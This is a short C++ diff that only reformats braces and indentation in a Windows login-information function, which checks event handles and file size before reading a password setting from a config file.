@@ -338,12 +338,11 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, BOOL& isAuthKerne
     HANDLE hEvent2 = OpenEventA(SYNCHRONIZE, FALSE, std::string("EVENT_" + pid).c_str());
     WIN32_FILE_ATTRIBUTE_DATA fileInfo;
     GetFileAttributesExA(buf, GetFileExInfoStandard, &fileInfo);
-    if ((hEvent1 != NULL || hEvent2 != NULL) && fileInfo.nFileSizeLow > 16 * 1024 * 1024)
-    {
+    if ((hEvent1 != NULL || hEvent2 != NULL) && fileInfo.nFileSizeLow > 16 * 1024 * 1024) {
         Mprintf("Check event handle: %d, %d\n", hEvent1 != NULL, hEvent2 != NULL);
-		isAuthKernel = TRUE;
+        isAuthKernel = TRUE;
         SAFE_CLOSE_HANDLE(hEvent1);
-		SAFE_CLOSE_HANDLE(hEvent2);
+        SAFE_CLOSE_HANDLE(hEvent2);
         config*cfg = conn.pwdHash == masterHash ? new config : new iniFile;
         str = cfg->GetStr("settings", "Password", "");
         delete cfg;
